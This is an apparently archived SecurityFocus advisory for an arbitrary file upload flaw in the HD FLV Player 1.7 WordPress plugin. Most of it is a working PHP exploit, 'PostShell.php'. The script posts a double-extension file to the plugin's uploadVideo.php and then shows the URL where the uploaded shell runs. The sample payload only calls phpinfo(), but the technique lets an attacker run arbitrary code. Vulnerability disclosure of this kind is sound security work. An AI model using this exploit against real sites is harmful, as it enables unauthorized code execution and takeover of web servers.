source: http://www.securityfocus.com/bid/53967/info

HD FLV Player plugin for WordPress is prone to a vulnerability that lets attackers upload arbitrary files. The issue occurs because the application fails to adequately sanitize user-supplied input.

An attacker can exploit this vulnerability to upload arbitrary code and run it in the context of the web server process. This may facilitate unauthorized access or privilege escalation; other attacks are also possible.

HD FLV Player 1.7 is vulnerable; other versions may also be affected. 

Exploit :

PostShell.php
<?php

$uploadfile="lo.php.jpg";
$ch = 
curl_init("http://www.example.com/wordpress/wp-content/plugins/contus-hd-flv-player/uploadVideo.php");
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_POSTFIELDS,
         array('myfile'=>"@$uploadfile",
                'mode'=>'image'));
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
$postResult = curl_exec($ch);
curl_close($ch);
print "$postResult";

?>

Shell Access : 
http://www.example.com/wordpress/wp-content/uploads/18_lo.php.jpg
Filename : [CTRL-u] PostShell.php after executed

lo.php.jpg
<?php
phpinfo();
?>